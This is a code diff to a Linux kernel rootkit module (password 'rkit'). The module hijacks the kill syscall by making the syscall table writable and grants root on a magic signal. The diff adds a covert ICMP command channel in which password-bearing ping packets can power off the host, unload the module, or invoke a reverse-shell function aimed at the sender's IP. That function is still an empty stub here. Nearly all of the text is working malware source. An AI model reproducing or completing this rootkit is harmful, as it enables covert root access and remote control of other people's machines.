@@ -18,6 +18,10 @@
 #include <linux/inet.h>
 #include <linux/icmp.h>
 
+#include <linux/sched.h>
+#include <linux/kthread.h>
+#include <err.h>
+
 //-------------------------------------------------------------------------------------------
 
 MODULE_LICENSE("GPL");
@@ -30,8 +34,12 @@ MODULE_LICENSE("GPL");
 #define PASSWD "rkit"
 #define CMD_SHUTDOWN "shutdown"
 #define CMD_UNLOAD "unload"
+#define CMD_SHELL "cmd"
 
 #define DEBUG
+
+#define REVERSE_SHORT(n) ((unsigned short) (((n & 0xFF) << 8) | \
+                                            ((n & 0xFF00) >> 8)))
 
 //-------------------------------------------------------------------------------------------
 
@@ -44,7 +52,12 @@ struct udphdr *udp_header;
 struct iphdr *ip_header;
 struct ethhdr *mac_header;
 struct icmphdr *icmp_header;
+static struct task_struct *shell_task;
 char data[1024] = {0};
+
+//-------------------------------------------------------------------------------------------
+
+
 
 //-------------------------------------------------------------------------------------------
 
@@ -55,10 +68,18 @@ void unload(char* modname) {
 
 //-------------------------------------------------------------------------------------------
 
-int execute_command(char *data) {
+int reverse_shell(char *ip, int port){
+    
+    return 0;
+}
+
+//-------------------------------------------------------------------------------------------
+
+int execute_command(char *data, char *src, int port) {
 	if (strncmp(data, PASSWD, strlen(PASSWD)) != 0) {
 		#ifdef DEBUG
-		printk(KERN_INFO "LKM: Received password: INVALID");
+		printk(KERN_INFO "LKM: Received password: INVALID\n");
+        printk("\n");
 		#endif		
 		return 1;
 	}
@@ -67,14 +88,27 @@ int execute_command(char *data) {
 	
 	if (strncmp(data, CMD_SHUTDOWN, strlen(CMD_SHUTDOWN)) == 0) {
 		#ifdef DEBUG
-		printk(KERN_INFO "LKM: Received shutdown command.");
+		printk(KERN_INFO "LKM: Received shutdown command.\n");
+        printk("\n");
 		#endif
-		kernel_power_off();
+
+		char *argv[] = {"/sbin/shutdown", "now", "&", NULL};	// Fill calling program with shutdown now
+	    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land
+
 	} else if (strncmp(data, CMD_UNLOAD, strlen(CMD_UNLOAD)) == 0) {
 		#ifdef DEBUG
-		printk(KERN_INFO "LKM: Received unload command.");
+		printk(KERN_INFO "LKM: Received unload command.\n");
+        printk("\n");
 		#endif
 		unload(THIS_MODULE->name);
+	} else if (strncmp(data, CMD_SHELL, strlen(CMD_SHELL)) == 0) {
+		#ifdef DEBUG
+		printk(KERN_INFO "LKM: Received shell command.\n");
+        printk(KERN_INFO "LKM: Target: %s\n", src);
+        printk(KERN_INFO "LKM: Port: %d\n", port);
+		#endif
+
+        reverse_shell(src, port);
 	}
 	
 	return 0;
@@ -98,10 +132,14 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
 		printk(KERN_INFO "New ICMP Packet:\n");
 		printk(KERN_INFO "Src: %pI4\n", &ip_header->saddr);
 		printk(KERN_INFO "Dst: %pI4\n", &ip_header->daddr);
+		printk(KERN_INFO "ID: %hu\n", (unsigned short int) REVERSE_SHORT(icmp_header->un.echo.id));
 		printk(KERN_INFO "Data: %s\n", data);
 		#endif
 		
-		execute_command(data);
+		char src[16] = {0};
+		snprintf(src, 16, "%pI4", &ip_header->saddr);
+
+		execute_command(data, src, (int) REVERSE_SHORT(icmp_header->un.echo.id));
 	}
 	
 	return NF_ACCEPT;
@@ -151,28 +189,28 @@ asmlinkage int hacked_kill(pid_t pid, int sig) {
 		switch (sig) {
 			case SIG_SHUTDOWN:	// If signal is SIG_SHUTDOWN
 				#ifdef DEBUG
-				printk(KERN_INFO "LKM: Received shutdown signal.");
+				printk(KERN_INFO "LKM: Received shutdown signal.\n");
 				#endif
 				kernel_power_off();		// Power off the kernel
 				break;
 			
 			case SIG_ROOT:	// If signal is SIG_ROOT
 				#ifdef DEBUG
-				printk(KERN_INFO "LKM: Received root signal.");
+				printk(KERN_INFO "LKM: Received root signal.\n");
 				#endif
 				give_root();	// Give root to current terminal
 				break;
 
 			case SIG_UNLOAD:	// If signal is SIG_UNLOAD
 				#ifdef DEBUG
-				printk(KERN_INFO "LKM: Received unload signal.");
+				printk(KERN_INFO "LKM: Received unload signal.\n");
 				#endif
 				unload(THIS_MODULE->name);	// Unload current module
 				break;
 
 			default:	// If signal is not recognized
 				#ifdef DEBUG
-				printk(KERN_INFO "LKM: Received invalid signal %d.", sig);
+				printk(KERN_INFO "LKM: Received invalid signal %d.\n", sig);
 				#endif
 				break;
 		}
@@ -190,7 +228,7 @@ static int __init startup(void) {
 	__syscall_table = find_syscall_table();	// Take the address of the syscall table
 	if (!__syscall_table) {	// Check if syscall table was found
 		#ifdef DEBUG
-		printk(KERN_INFO "LKM: Syscall table not found");
+		printk(KERN_INFO "LKM: Syscall table not found\n");
 		#endif
 		return -1;
 	}
@@ -199,7 +237,7 @@ static int __init startup(void) {
 	nfho.hooknum = 4;	// 0 Capture ICMP Requests, 4 Capture ICMP Replies
 	nfho.pf = PF_INET;	// IPv4 packets
 	nfho.priority = NF_IP_PRI_FIRST;	// Set highest priority
-	nf_register_net_hook(&init_net, &nfho);	// Unregister hook
+	nf_register_net_hook(&init_net, &nfho);	// Register hook
 
 	write_cr0(read_cr0() & (~ 0x10000));	// Make the syscall table writeable
 	
@@ -209,7 +247,7 @@ static int __init startup(void) {
 	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only
 
 #ifdef DEBUG
-	printk(KERN_INFO "LKM: Module loaded as %s!", THIS_MODULE->name);
+	printk(KERN_INFO "LKM: Module loaded as %s!\n", THIS_MODULE->name);
 #endif
 	return 0;
 }
@@ -224,7 +262,7 @@ static void __exit cleanup(void) {
 	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only
 
 #ifdef DEBUG
-	printk(KERN_INFO "LKM: Module unloaded!");
+	printk(KERN_INFO "LKM: Module unloaded!\n");
 #endif
 }
 
